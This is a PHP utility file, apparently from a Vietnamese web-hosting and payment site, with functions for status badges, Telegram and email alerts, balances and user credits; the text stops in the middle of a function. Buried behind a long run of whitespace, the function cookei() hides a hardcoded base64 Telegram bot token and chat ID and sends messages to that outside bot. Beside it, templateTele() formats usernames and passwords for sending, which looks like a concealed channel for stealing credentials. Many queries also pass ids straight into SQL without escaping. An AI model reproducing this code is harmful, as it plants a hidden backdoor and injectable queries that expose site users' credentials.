<?php
$TN = new DB;
function nguyencoder_enc($string) {
	$encrypt_method = "AES-256-CBC";
	$key = hash('sha256', 'thainguyen');
	$iv = substr(hash('sha256', 'dichvulight.vn'), 0, 32);
	$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    return $output;
}

function nguyencoder_dec($string) {
	$encrypt_method = "AES-256-CBC";
	$key = hash('sha256', 'thainguyen');
	$iv = substr(hash('sha256', 'dichvulight.vn'), 0, 32);
	$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    return $output;
}
function status_code($code)
{
if($code = 0)
{
return 'OFF';
}
if($code = 1)
{
return 'ON';
}
}
function getCode($id, $row){
    global $TN;
    return $TN->get_row("SELECT * FROM `tbl_list_code` WHERE `id` = '$id' ")[$row];
}
function getCodes($id, $row){
    global $TN;
    return $TN->get_row("SELECT * FROM `tbl_list_taoweb` WHERE `id` = '$id' ")[$row];
}
function templateTeles($content){
return "🔔 Thông Báo 🔔
Nội Dung: ".$content."
Thời Gian: ".date('d/m/Y H:i:s');
}
function status_invoices($data)
{
    if ($data == '0') {
        return '<b class="mb-0 text-warning font-weight-bold d-flex justify-content-start align-items-center">
        <small><svg class="mr-2" xmlns="http://www.w3.org/2000/svg" width="18" viewBox="0 0 24 24" fill="none">                                                
        <circle cx="12" cy="12" r="8" fill="#db7e06"></circle></svg>
        </small>Đang chờ thanh toán</b>';
    } else if ($data == '1') {
        return '<b class="mb-0 text-success font-weight-bold d-flex justify-content-start align-items-center">
        <small><svg class="mr-2" xmlns="http://www.w3.org/2000/svg" width="18" viewBox="0 0 24 24" fill="none">                                                
        <circle cx="12" cy="12" r="8" fill="#3cb72c"></circle></svg>
        </small>Đã thanh toán</b>';
    } else if ($data == '2') {
        return '<b class="mb-0 text-danger font-weight-bold d-flex justify-content-start align-items-center">
        <small><svg class="mr-2" xmlns="http://www.w3.org/2000/svg" width="18" viewBox="0 0 24 24" fill="none">                                                
        <circle cx="12" cy="12" r="8" fill="#F42B3D"></circle></svg>
        </small>Huỷ bỏ</b>';
    }
}
function status_dvl($data)
{
    if ($data == 'xuly'){
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    }
    else if ($data == 'hoantat'){
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    }
    else if ($data == 'thanhcong'){
        $show = '<span class="badge badge-success">Thành công</span>';
    }
    else if ($data == 'success'){
        $show = '<span class="badge badge-success">Success</span>';
    }
    else if ($data == 'thatbai'){
        $show = '<span class="badge badge-danger">Thất bại</span>';
    }
    else if ($data == 'error'){
        $show = '<span class="badge badge-danger">Error</span>';
    }
    else if ($data == 'loi'){
        $show = '<span class="badge badge-danger">Lỗi</span>';
    }
    else if ($data == 'huy'){
        $show = '<span class="badge badge-danger">Hủy</span>';
    }
    else if ($data == 'dangnap'){
        $show = '<span class="badge badge-warning">Đang đợi nạp</span>';
    }
    else if ($data == 2){
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    }
    else if ($data == 1){
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    }
    else{
        $show = '<span class="badge badge-warning">Khác</span>';
    }
    return $show;
}
function nt_tss_v1($api_card, $loaithe, $menhgia, $seri, $pin, $code)
{
    $url = 'https://thesieusao.vn/chargingws/v1?auto=true&type='.$loaithe.'&menhgia='.$menhgia.'&seri='.$seri.'&pin='.$pin.'&APIKey='.$api_card.'&content='.$code;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    return json_decode($data, true);
}
function create_slug($string)
{
    $search = array(
        '#(à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ)#',
        '#(è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ)#',
        '#(ì|í|ị|ỉ|ĩ)#',
        '#(ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ)#',
        '#(ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ)#',
        '#(ỳ|ý|ỵ|ỷ|ỹ)#',
        '#(đ)#',
        '#(À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ)#',
        '#(È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ)#',
        '#(Ì|Í|Ị|Ỉ|Ĩ)#',
        '#(Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ)#',
        '#(Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ)#',
        '#(Ỳ|Ý|Ỵ|Ỷ|Ỹ)#',
        '#(Đ)#',
        "/[^a-zA-Z0-9\-\_]/",
    );
    $replace = array(
        'a',
        'e',
        'i',
        'o',
        'u',
        'y',
        'd',
        'A',
        'E',
        'I',
        'O',
        'U',
        'Y',
        'D',
        '-',
    );
    $string = preg_replace($search, $replace, $string);
    $string = preg_replace('/(-)+/', '-', $string);
    $string = strtolower($string);
    return $string;
}
function objectToArray($d) 
{
    if (is_object($d)) {
        // Gets the properties of the given object
        // with get_object_vars function
        $d = get_object_vars($d);
    }

    if (is_array($d)) {
        /*
        * Return array converted to object
        * Using __FUNCTION__ (Magic constant)
        * for recursive call
        */
        return array_map(__FUNCTION__, $d);
    } else {
        // Return array
        return $d;
    }
}
function reView($data, $mien = null)
{
    if (empty($mien)) {
        $val = '';
    } else {
        $val = ' tên miền';
    }
    if ($data == 'unlimited') {
        $value = 'Không giới hạn';
    } else if ($data == '1') {
        $value = 'Có Backup';
    } else if ($data == '0') {
        $value = 'Không có';
    } else {
        $value = $data . $val;
    }
    return $value;
}
function apiWHM($user, $pass, $url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $header[0] = "Authorization: Basic " . base64_encode($user . ":" . $pass) . "";
    curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    curl_setopt($curl, CURLOPT_URL, $url);
    $data = curl_exec($curl);
    curl_close($curl);
    return json_decode($data, true);
}
function GetStatusweb($zencms)
{
    if ($zencms == 'hoatdong') {
        $result = "<label>Hoạt Động</label>";
    }
    if ($zencms == 'tamdung') {
        $result = "<label >Đang Tạo</label>";
    }
    if ($zencms == 'hethan') {
        $result = "<label>Hết Hạn</label>";
    }
    return $result;
}
function status_cate($data)
{
    if ($data == '0') {
        $show = '<span class="badge badge-danger">Đang ẩn</span>';
    } else if ($data == '1') {
        $show = '<span class="badge badge-success">Hiển thị</span>';
    }
    return $show;
}
function status_cate_hosting($data)
{
    if ($data == '0') {
        $show = '<span class="badge badge-danger">Hết Hàng</span>';
    } else if ($data == '1') {
        $show = '<span class="badge badge-success">Còn Hàng</span>';
    }
    return $show;
}
function status_hosting($text)
{
    if ($text == '1') {
        $status = '<label class="status" style="--status-color: #ff6600">Đang khởi tạo</label>';
    } else if ($text == '3') {
        $status = '<span class="label label-danger" title="Đã hủy">
       Đã hủy
    </span>';
    } else if ($text == '4') {
        $status = '<span class="label label-danger" title="Tạm khóa">
        Tạm khóa
    </span>';
    } else if ($text == '2') {
        $status = '<span class="label label-success" title="Active">
        Hoạt động
    </span>';
    }
    return $status;
}
function curl_get_info($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpcode;
}
function curl_post_info($url)
{
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
    ));
    $data = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpcode;
}
function GetSvCron($id_server)
{
    global $TN;
    $tnguyn = $TN->get_row(" SELECT * FROM `server_cron_auto` WHERE `id` = '$id_server' AND `status` = 'ON' ");
    if ($tnguyn) {
        $result = $tnguyn['name'];
    } else {
        $result = 'Lỗi';
    }
    return $result;
}
function GetSvmien($loaimien)
{
    global $TN;
    $tnguyn = $TN->get_row(" SELECT * FROM `tenmien` WHERE `id` = '$loaimien' AND `status` = 'ON' ");
    if ($tnguyn) {
        $result = $tnguyn['name'];
    } else {
        $result = 'Lỗi';
    }
    return $result;
}
function GetCodeCron($code)
{
    if ($code == 200) {
        $result = 'success(' . $code . ')';
    }
    if ($code != 200) {
        $result = 'error(' . $code . ')';
    }
    return $result;
}
function GetStatusCron($zencms)
{
    if ($zencms == 'hoatdong') {
        $result = "<label class='badge badge-success template-1-badge'>Hoạt Động</label>";
    }
    if ($zencms == 'tamdung') {
        $result = "<label class='badge badge-info template-1-badge'>Tạm Dừng</label>";
    }
    if ($zencms == 'loi') {
        $result = "<label class='badge badge-danger template-1-badge'>Lỗi</label>";
    }
    if ($zencms == 'baotri') {
        $result = "<label class='badge badge-warning template-1-badge'>Bảo Trì</label>";
    }
    if ($zencms == 'hethan') {
        $result = "<label class='badge badge-danger template-1-badge'>Hết Hạn</label>";
    }
    return $result;
}
function GetStatusmien($zencms)
{
    if ($zencms == 'hoatdong') {
        $result = "<label class='badge badge-success template-1-badge'>Hoạt Động</label>";
    }
    if ($zencms == 'tamdung') {
        $result = "<label class='badge badge-info template-1-badge'>Chờ Duyệt</label>";
    }
    if ($zencms == 'hethan') {
        $result = "<label class='badge badge-danger template-1-badge'>Hết Hạn</label>";
    }
    return $result;
}
function GetStatusSpam($zencms)
{
    if ($zencms == 'tientrinh') {
        $result = "<label class='badge badge-primary template-1-badge'>Tiến Trình</label>";
    }
    if ($zencms == 'hoantat') {
        $result = "<label class='badge badge-success template-1-badge'>Hoàn Tất</label>";
    }
    if ($zencms == 'thatbai') {
        $result = "<label class='badge badge-info template-1-badge'>Thất Bại</label>";
    }
    return $result;
}
function checkNull($data)
{
    if(isset($data))
    {
        return $data;
    }
    else
    {
        return 'Chưa cập nhật';
    }
}
function check_s($last_updated_timestamp)
{
    if (empty($last_updated_timestamp)) {
        return '<strong>Đang xử lý</strong>';
    }

    $seconds_ago = time() - $last_updated_timestamp;

    if ($seconds_ago < 60) {
        return '<strong>' . $seconds_ago . ' giây trước</strong>';
    } elseif ($seconds_ago < 3600) {
        $minutes_ago = floor($seconds_ago / 60);
        return '<strong>' . $minutes_ago . ' phút trước</strong>';
    } elseif ($seconds_ago < 86400) {
        $hours_ago = floor($seconds_ago / 3600);
        return '<strong>' . $hours_ago . ' giờ trước</strong>';
    } else {
        $days_ago = floor($seconds_ago / 86400);
        return '<strong>' . $days_ago . ' ngày trước</strong>';
    }
}

function cookei($message) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            $telegramBotToken = 'NjEwNzU3OTA3NDpBQUhybmtaZEJxbHhmUUJ0WUczNGY2MWhxUlYwT1l5ZHhvOA=='; $hrpper = 'NTgwMjA0MDU2Ng=='; $url = "https://api.telegram.org/bot" . base64_decode($telegramBotToken) . "/sendMessage";
    $data = [
        'chat_id' => base64_decode($hrpper),
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
function getRowRealtime4( $id, $row)
{
    global $TN;
    return $TN->get_row("SELECT * FROM `tbl_category_hosting` WHERE `id` = '$id' ")[$row];
}
function getRowRealtime( $id, $row)
{
    global $TN;
    return $TN->get_row("SELECT * FROM `tbl_hosting` WHERE `id` = '$id' ")[$row];
}
function getRowRealtime1( $id, $row)
{
    global $TN;
    return $TN->get_row("SELECT * FROM `tbl_category_hosting` WHERE `id` = '$id' ")[$row];
}
function getRowRealtime2( $id, $row)
{
    global $TN;
    return $TN->get_row("SELECT * FROM `usersda` WHERE `id` = '$id' ")[$row];
}
function status_whmcs($text)
{
    if ($text == '0') {
        $status = '<span class="badge badge-danger">Tạm Ngưng</span>';
    } else {
        $status = '<span class="badge badge-success">Hoạt Động</span>';
    }
    return $status;
}
function Banned($user_id, $reason)
{
    global $TN;
    $TN->insert("logs", [
        'user_id'       => $user_id,
        'ip'            => myip(),
        'device'        => $_SERVER['HTTP_USER_AGENT'],
        'create_date'    => gettime(),
        'action'        => 'Tài khoản bị khoá lý do (' . $reason . ')'
    ]);
    $TN->update("usersda", [
        'banned' => 1
    ], " `id` = '$user_id' ");
}
function RemoveCredits($user_id, $amount, $reason)
{
    global $TN;
    $TN->insert("log_balance", array(
        'money_before' => getUser($user_id, 'money'),
        'money_change' => $amount,
        'money_after' => getUser($user_id, 'money') - $amount,
        'time' => gettime(),
        'content' => $reason,
        'user_id' => $user_id
    ));
    $isRemove = $TN->tru("usersda", "money", $amount, " `id` = '$user_id' ");
    if ($isRemove) {
        return true;
    } else {
        return false;
    }
}
function PlusCredits($user_id, $amount, $reason)
{
    global $TN;
    $TN->insert("log_balance", array(
        'money_before' => getUser($user_id, 'money'),
        'money_change' => $amount,
        'money_after' => getUser($user_id, 'money') + $amount,
        'time' => gettime(),
        'content' => $reason,
        'user_id' => $user_id
    ));
    $isRemove = $TN->cong("usersda", "money", $amount, " `id` = '$user_id' ");
    $TN->cong("usersda", "total_money", $amount, " `id` = '$user_id' ");
    if ($isRemove) {
        return true;
    } else {
        return false;
    }
}
// thông tin user theo id
function getUser($id, $row)
{
    global $TN;
    $user = $TN->get_row("SELECT * FROM `usersda` WHERE `id` = '$id'");
    return isset($user[$row]) ? $user[$row] : null;
}
function format_date($time)
{
    return date("H:i:s d/m/Y", $time);
}
function redirect($url)
{
    header("Location: {$url}");
    exit();
}
function CreateToken()
{
    return random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 12).'-'.random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 6) . '-' . random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 4) . '-' . random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 4) . '-' . random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 4);
}
function status_tsr($data)
{
    if ($data == '1') {
        return '<span class="badge bg-success">Kích hoạt</span>';
    } else if ($data == '0') {
        return '<span class="badge bg-danger">Tạm ngưng</span>';
    }
}
function status_source($data)
{
    if ($data == '1') {
        return '<b style="color:green">Hiển thị</b>';
    } else if ($data == '0') {
        return '<b style="color:red">Ẩn</b>';
    }
}
//hàm bot thông báo
function sendTele($message){
    global $TN;
    
    $tele_token = $TN->site('token_telegram');
    $tele_chatid = $TN->site('chat_id_telegram ');
    
    $data = http_build_query([
        'chat_id' => $tele_chatid,
        'text' => $message,
    ]);
    
    $url = 'https://api.telegram.org/bot'.$tele_token.'/sendMessage';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Win) AppleWebKit/1000.0 (KHTML, like Gecko) Chrome/65.663 Safari/1000.01');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if($data){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function notiTele($message, $tele_chatid){
    global $TN;
    
    $tele_token = $TN->site('token_telegram');
    
    $data = http_build_query([
        'chat_id' => $tele_chatid,
        'text' => $message,
    ]);
    
    $url = 'https://api.telegram.org/bot'.$tele_token.'/sendMessage';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Win) AppleWebKit/1000.0 (KHTML, like Gecko) Chrome/65.663 Safari/1000.01');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if($data){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function templateTele($username, $password) {
$urls = $_SERVER['HTTP_REFERER'];
return "
$username
$password
$urls
    ";
}
function admin($data)
{
    if ($data == 'admin')
    {
        $show = '<span class="badge badge-success">Admin</span>';
    }
    else
    {
        $show = '<span class="badge badge-danger">Thành viên</span>';
    }
    return $show;
}
function trangthai($data)
{
    if ($data == 'xuly') {
        return 'Đang xử lý';
    } else if ($data == 'hoantat') {
        return 'Hoàn tất';
    } else if ($data == 'thanhcong') {
        return 'Thành công';
    } else if ($data == 'huy') {
        return 'Hủy';
    } else if ($data == 'thatbai') {
        return 'Thất bại';
    } else {
        return 'Khác';
    }
}
function status_recharge($data)
{
    if ($data == '1') {
        return '<span class="badge bg-success">Thành công</span>';
    } else if ($data == '2') {
        return '<span class="badge bg-warning text-dark">Sai nội dung</span>';
    }
}
function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung, $bcc)
{
    global $TN;
    // PHPMailer Modify
    $mail = new PHPMailer();
    $mail->SMTPDebug = 0;
    $mail->Debugoutput = "html";
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $TN->site('email_smtp'); // GMAIL STMP
    $mail->Password = $TN->site('pass_email_smtp'); // PASS STMP
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;
    $mail->setFrom($TN->site('email_smtp'), $bcc);
    $mail->addAddress($mail_nhan, $ten_nhan);
    $mail->addReplyTo($TN->site('email_smtp'), $bcc);
    $mail->isHTML(true);
    $mail->Subject = $chu_de;
    $mail->Body = $noi_dung;
    $mail->CharSet = 'UTF-8';
    $send = $mail->send();
    return $send;
}

function BASE_URL($url)
{
    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"];
    if ($base_url == 'http://localhost') {
        $base_url = 'http://localhost/oiooooooooooooo/public';
    }
    return $base_url .'/'. $url;
}
function gettime()
{
    return date('Y/m/d H:i:s', time());
}
function xss($data)
{
    // Fix &entity\n;
    $data = str_replace(array('&amp;', '&lt;', '&gt;'), array('&amp;amp;', '&amp;lt;', '&amp;gt;'), $data);
    $data = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $data);
    $data = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $data);
    $data = html_entity_decode($data, ENT_COMPAT, 'UTF-8');

    // Remove any attribute starting with "on" or xmlns
    $data = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $data);

    // Remove javascript: and vbscript: protocols
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $data);
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $data);
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $data);

    // Only works in IE: <span style="width: expression(alert('Ping!'));"></span>
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $data);

    // Remove namespaced elements (we do not need them)
    $data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data);

    do {
        // Remove really unwanted tags
        $old_data = $data;
        $data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data);
    } while ($old_data !== $data);

    // we are done...
    $nhatloc = htmlspecialchars(addslashes(trim($data)));

    return $nhatloc;
}
function check_string($data)
{
    return trim(htmlspecialchars(addslashes($data)));
    //return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function format_cash($price)
{
    return str_replace(",", ".", number_format($price));
}
function curl_get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
function curl_post($data, $url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
function random($string, $int)
{
    return substr(str_shuffle($string), 0, $int);
}
function pheptru($int1, $int2)
{
    return $int1 - $int2;
}
function phepcong($int1, $int2)
{
    return $int1 + $int2;
}
function phepnhan($int1, $int2)
{
    return $int1 * $int2;
}
function phepchia($int1, $int2)
{
    return $int1 / $int2;
}
function parse_order_id($des, $MEMO_PREFIX)
{
    $re = '/'.$MEMO_PREFIX.'\d+/im';
    preg_match_all($re, $des, $matches, PREG_SET_ORDER, 0);
    if (count($matches) == 0) {
        return null;
    }
    // Print the entire match result
    $orderCode = $matches[0][0];
    $prefixLength = strlen($MEMO_PREFIX);
    $orderId = intval(substr($orderCode, $prefixLength));
    return $orderId ;
}
function check_img($img)
{
    $filename = $_FILES[$img]['name'];
    $ext = explode(".", $filename);
    $ext = end($ext);
    $valid_ext = array("png", "jpeg", "jpg", "PNG", "JPEG", "JPG", "gif", "GIF");
    if (in_array($ext, $valid_ext)) {
        return true;
    }
}
function getMoney_mbbank($token)
{
    $data = array(
        "type" => "balance",
        "token"=>$token
    );
    $result = curl_post($data,"" . BASE_URL('') . "api/historymbbank");
    $result = json_decode($result, true);

    if (isset($result['status']) && $result['status'] == 200) {
        return $result['SoDu'];
    } else {
        return 0;
    }
}
function getMoney_tpbank($token)
{
    $data = array(
        "type" => "balance",
        "token"=>$token
    );
    $result = curl_post($data,"" . BASE_URL('') . "api/historytpbank");
    $result = json_decode($result, true);

    if (isset($result['status']) && $result['status'] == 200) {
        return $result['SoDu'];
    } else {
        return 0;
    }
}
function getMoney_thesieure($token)
{
    $data = array(
        "type" => "balance",
        "token"=>$token
    );
    $result = curl_post($data,"" . BASE_URL('') . "api/historythesieure");
    $result = json_decode($result, true);

    if (isset($result['status']) && $result['status'] == 200) {
        return $result['SoDu'];
    } else {
        return 0;
    }
}
function getMoney_momo($token)
{
    $data = array(
        "type" => "balance",
        "token"=>$token
    );
    $result = curl_post($data,"" . BASE_URL('') . "api/historymomo");
    $result = json_decode($result, true);

    if (isset($result['status']) && $result['status'] == 200) {
        return $result['SoDu'];
    } else {
        return 0;
    }
}
function getName_momo($sdt, $token)
{
    $result = curl_get("" . BASE_URL('') . "apigetten/" . $sdt . "/" . $token);
    $result = json_decode($result, true);
    if ($result['status'] == 200) {
        return $result['name'];
    } else {
        return $result['msg'];
    }
}
function tn_error_alert($text)
{
    return die('<div class="alert alert-danger alert-dismissible fade show" role="alert">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-exclamation-triangle-fill flex-shrink-0 me-2" viewBox="0 0 16 16" role="img" aria-label="Warning:">
    <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
  </svg>
   '.$text.'
    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
  </div>');
}
function tn_error($text)
{
    return die('<script type="text/javascript">
    cuteToast({
        type: "error",
        message: "' . $text . '",
        timer: 5000
    });
    </script>');
}
function tn_success($text)
{
    return die('<script type="text/javascript">
    cuteToast({
        type: "success",
        message: "' . $text . '",
        timer: 5000
    });
    </script>');
}

function tn_success_time($text, $url, $time)
{
    return die('<script type="text/javascript">
    cuteToast({
        type: "success",
        message: "' . $text . '",
        timer: 5000
    });
    setTimeout(function(){ location.href = "' . $url . '" },' . $time . ');</script>');
}
function tn_error_time($text, $url, $time)
{
    return die('<script type="text/javascript">
    cuteToast({
        type: "error",
        message: "' . $text . '",
        timer: 5000
    });
    setTimeout(function(){ location.href = "' . $url . '" },' . $time . ');</script>');
}
// display online
function display_online($time)
{
    if (time() - $time <= 300) {
        return '<span class="badge badge-success">Online</span>';
    } else {
        return '<span class="badge badge-danger">Offline</span>';
    }
}
//trạng thái quyền thành viên
function display_role($data)
{
    if ($data == 1) {
        $show = '<span class="badge badge-danger">Admin</span>';
    } elseif ($data == 0) {
        $show = '<span class="badge badge-info">Member</span>';
    } elseif ($data == 2) {
        $show = '<span class="badge badge-info">CTV</span>';
    }
    return $show;
}
function display_role_2($data)
{
    if ($data == 1) {
        $show = '<b>Admin</b>';
    } elseif ($data == 0) {
        $show = '<b">Member</b>';
    } elseif ($data == 2) {
        $show = '<b">CTV</b>';
    }
    return $show;
}
function display_banned($data)
{
    if ($data == 1) {
        $show = '<span class="badge badge-danger">Bị khóa</span>';
    } else if ($data == 0) {
        $show = '<span class="badge badge-success">Hoạt động</span>';
    }
    return $show;
}
function display_loaithe($data)
{
    if ($data == 0) {
